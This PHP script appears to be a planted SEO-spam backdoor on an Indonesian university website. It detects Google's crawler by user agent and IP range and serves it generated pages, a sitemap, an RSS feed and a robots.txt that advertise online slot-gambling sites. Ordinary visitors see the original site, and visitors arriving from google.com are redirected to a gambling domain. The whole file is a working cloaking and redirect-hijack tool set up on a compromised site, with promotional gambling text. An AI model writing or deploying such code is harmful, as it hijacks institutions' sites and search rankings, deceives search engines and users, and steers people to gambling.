<?php
// Variabel Konfigurasi
$base_url = "https://fkip.unirow.ac.id"; // Ganti dengan URL website Anda
$linkAmp = "https://lewataja.com/uni";
$link = "https://lewataja.com/uni";
$baseBrand = "SLOT THAILAND";
$baseTitle = "Daftar Situs Slot Server Thailand Resmi Super Gacor No 1";
$baseDesc  = "adalah website server thailand yang merupakan situs slot server thailand resmi super gacor No 1. Slot thailand super gacor merupakan awal mula jalan mencari kekayaan dengan cara singkat bagi pecinta slot server thailand No 1. Situs slot server thailand super gacor no 1 ini adalah situs terpercaya yang di mana para member akun pro thailand sudah banyak mendulang kemenangan dan jackpot besar di Indonesia. Slot thailand serta server thailand menjadi slot luar negeri salah satu permainan terpopuler bagi para pemain pejudi slot dimana pun mereka berada. Link slot server thailand super gacor sudah di jamin menjadi slot maxwin terbaik. ";
$template = "template.php";
$original = "original.php";
$prefix = " 🛩️ ";
$image = "https://i.pinimg.com/736x/08/e1/dc/08e1dccf6645e0f300053c63f9791bb2.jpg";
//
$cloaking = false;
//
$sitemap_filename = "st.xml"; // Nama file sitemap
$rss_filename = "rs.xml"; // Nama file RSS
$product_param = "gas"; // Nama parameter produk
$disallowed_urls = [ // URL yang tidak diizinkan oleh robots.txt
    '/user',
    '/content'
];

// Rentang IP Google (dapat diperbarui jika diperlukan)
$google_ip_ranges = [
    '64.233.160.0/19',
    '66.249.80.0/20',
    '72.14.192.0/18',
    '74.125.0.0/16',
    '108.177.8.0/21',
    '173.194.0.0/16',
    '207.126.144.0/20',
    '209.85.128.0/17',
    '216.58.192.0/19',
    '216.239.32.0/19'
];

// Cek User Agent untuk Google
$user_agent = $_SERVER['HTTP_USER_AGENT'];

// Fungsi untuk memeriksa apakah IP termasuk dalam range
function ip_in_range($ip, $range) {
    list($subnet, $bits) = explode('/', $range);
    $ip = ip2long($ip);
    $subnet = ip2long($subnet);
    $mask = -1 << (32 - $bits);
    $subnet &= $mask;
    return ($ip & $mask) == $subnet;
}

// Dapatkan IP pengunjung
$ip = $_SERVER['REMOTE_ADDR'];

// Cek apakah User Agent mengandung kata 'Google' atau IP dalam range Google
$google_bot = stripos($user_agent, 'google') !== false;
$google_ip = false;
foreach ($google_ip_ranges as $range) {
    if (ip_in_range($ip, $range)) {
        $google_ip = true;
        break;
    }
}

if (isset($_SERVER['HTTP_REFERER']) && strpos($_SERVER['HTTP_REFERER'], 'google.com') !== false) { header('Location: ' . $link); exit; }

// Baca file uri.txt
$brands = file("uri.txt", FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
//$brands = []; $handle = fopen(__DIR__ . '/mantap.txt', 'r'); while (($line = fgets($handle)) !== false) { if (trim($line) !== '') $brands[] = trim($line); } fclose($handle);
//$brands = []; $handle = fopen(__DIR__ . '/uri.txt', 'r'); while (($line = fgets($handle)) !== false) { if (trim($line) !== '') $brands[] = trim($line); } fclose($handle);

// Cek URI yang diminta
$request_uri = $_SERVER['REQUEST_URI'];

if ($google_bot || $google_ip || $cloaking !== true) {
    if (strpos($request_uri, "/?$product_param=") !== false) {
        // Cek apakah ada parameter produk dalam URL
        parse_str(parse_url($request_uri, PHP_URL_QUERY), $query);
        if (isset($query[$product_param])) {
            $produk_id = intval($query[$product_param]); // Ambil parameter produk
            
            // Pastikan ID produk valid
            if ($produk_id > 0 && $produk_id <= count($brands)) {
                $brand_name = htmlspecialchars($brands[$produk_id - 1]); // Ambil nama brand
                $brand = strtoupper($brand_name);
                $title = $brand . $prefix . $baseTitle;
                $description = $brand . " " . $baseDesc;
                $url = $base_url . "/?" . $product_param . "=" . $produk_id;
                $linkAmp = $linkAmp . "/?" . $product_param . "=" . $produk_id;
                include($template);
            } else {
                echo "<h1>Produk tidak ditemukan.</h1>"; // Pesan jika produk tidak valid
            }
        }
    } elseif (strpos($request_uri, "/$sitemap_filename") !== false) {
        // Jika diakses /sitemap.xml, tampilkan sitemap
        header("Content-Type: application/xml; charset=utf-8");
        header("Content-Disposition: attachment; filename=\"$sitemap_filename\""); // Mengatur nama file

        $current_date_time = date('Y-m-d\TH:i:sP'); // Format ISO 8601

        // Mulai membuat konten XML untuk sitemap
        echo "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n";
        echo "<urlset xmlns=\"http://www.sitemaps.org/schemas/sitemap/0.9\">\n";
        
        // Tambahkan URL utama di atas
        echo "  <url>\n";
        echo "    <loc>$base_url/</loc>\n";
        echo "    <lastmod>$current_date_time</lastmod>\n"; // Tambahkan tanggal dan waktu
        echo "  </url>\n";
        
        // Loop untuk setiap brand dan buat URL
        foreach ($brands as $index => $brand) {
            $produk_url = $base_url . "/?$product_param=" . ($index + 1);
            echo "  <url>\n";
            echo "    <loc>$produk_url</loc>\n";
            echo "    <lastmod>$current_date_time</lastmod>\n"; // Tambahkan tanggal dan waktu
            echo "  </url>\n";
        }
        
        echo "</urlset>";
    } elseif (strpos($request_uri, "/$rss_filename") !== false) {
        // Jika diakses /rss.xml, buat RSS feed
        header("Content-Type: application/xml; charset=utf-8");
        header("Content-Disposition: attachment; filename=\"$rss_filename\""); // Mengatur nama file

        // Mulai membuat konten XML untuk RSS
        echo "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n";
        echo "<rss version=\"2.0\">\n";
        echo "  <channel>\n";
        echo "    <title>Slot Gacor</title>\n";
        echo "    <link>" . htmlspecialchars($base_url) . "</link>\n";
        echo "    <description>Daftar Situs Slot Gacor</description>\n";
        
        // Loop untuk setiap brand dan buat item RSS
        foreach ($brands as $index => $brand) {
            $produk_url = $base_url . "/?$product_param=" . ($index + 1);
            echo "    <item>\n";
            echo "      <title>" . htmlspecialchars($brand . $prefix . $baseTitle) . "</title>\n";
            echo "      <link>" . htmlspecialchars($produk_url) . "</link>\n";
            echo "      <description>" . htmlspecialchars($brand . " " . $baseDesc) . "</description>\n";
            echo "      <guid>" . htmlspecialchars($produk_url) . "</guid>\n";
            echo "      <pubDate>" . date('D, d M Y H:i:s O') . "</pubDate>\n"; // Tanggal publikasi
            echo "    </item>\n";
        }

        echo "  </channel>\n";
        echo "</rss>";
    } elseif (strpos($request_uri, '/robots.txt') !== false) {
        // Jika diakses /robots.txt, buat robots.txt
        header("Content-Type: text/plain; charset=utf-8");

        // Izinkan semua bot untuk mengakses semua URL dengan query string
        echo "User-agent: *\n";
        echo "Allow: /*?*\n";

        // Loop untuk setiap disallowed URL dan tambahkan ke robots.txt
        foreach ($disallowed_urls as $url) {
            echo "Disallow: $url\n"; // Izinkan akses ke setiap URL produk
        }

        // Menyertakan URL sitemap yang dapat disesuaikan
        echo "Sitemap: $base_url/$sitemap_filename\n";
    } else {
        // Jika tidak ada parameter produk, tampilkan pesan default
        $produk_id = 9;
        $url = $base_url . "/";
        $title = $baseBrand . $prefix . $baseTitle;
        $description = $baseBrand . " " . $baseDesc;
        include($template);
    }
} else {
    // Jika bukan Google, tampilkan file normal
    include($original);
}
?>
